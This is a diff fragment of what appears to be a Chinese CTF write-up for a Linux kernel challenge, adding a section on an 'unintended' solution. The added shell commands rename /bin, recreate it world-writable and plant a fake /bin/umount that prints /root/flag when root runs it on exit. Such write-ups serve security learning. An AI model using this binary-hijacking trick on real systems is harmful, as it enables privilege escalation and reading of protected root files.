@@ -250,3 +250,13 @@ check_vmlinux $img
 # Bail out:
 echo "$me: Cannot find vmlinux." >&2
 ```
+
+## 非预期
+```bash
+mv bin bin1
+/bin1/mkdir bin
+/bin1/chmod 777 bin
+/bin1/echo "/bin1/cat /root/flag" > /bin/umount
+/bin1/chmod 777 /bin/umount
+exit
+```
